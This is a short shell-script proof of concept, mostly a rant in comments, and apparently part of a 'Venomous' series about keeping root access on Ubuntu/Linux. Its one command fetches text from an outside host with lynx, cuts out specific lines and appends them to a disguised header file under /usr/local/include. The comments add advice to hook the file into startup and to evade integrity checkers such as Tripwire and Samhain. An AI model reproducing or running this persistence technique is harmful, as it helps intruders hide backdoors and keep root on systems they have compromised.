# Ugly method too keep a rootaccount Follows... For those not in the know...
# Venomous was an idea made to prove a point, not give script kiddiots another
# tool to be morons with. Instead of ruining things, how about solving...
# Instead of naysaying... Prove me wrong


# Pick a ranDumb file in /usr/includes/ then create the samevbackdoor on the
# system using this filename. Do something sneaky on your own to place this
# file on a startup I could show you, but then I would have to kill -9 you

# Note the location... Highly doubtable to remove an actual include file
# unless some stupid admin did something really dumb... Before someone mouths
# around via e-mail... I could have written this all inclusively but I chose
# not to for obvious reasons...

lynx -dump http://www.infiltrated.net/ubuntuDestruction.php|sed -n '226,233p' >> /usr/local/include/$filename.h

# Now of course I could have modified this to replicate any one of the files
# on startup but again... PoC ... The naysayers will ramble on about "You're
# out of your mind..." Am I? I've given you the PoC's what more do you want...
# Ubuntu or any Linux for the lowly home user is a horrible idea...

# And AGAIN before someone fires off "I would see the URL and that's a dead
# giveaway!" ... Look, I'm trying to make a point here... I "could have" 
# a functioning backdoor undetectable to most integrity checkers, Samhain,
# Tripwire etc., but why should I disclose this anywhere. It's not in the
# best interest of anyone to do so... Don't bother asking for it via email
# because it's not public and will never be...

# This again... Was to prove a point to the naysayers who this shit doesn't
# happen... Keep dreaming. Its only a matter of time before you guys go
# Goo Goo about getting Linux for Idjits off the ground, but its a horrible
# mistake in the making
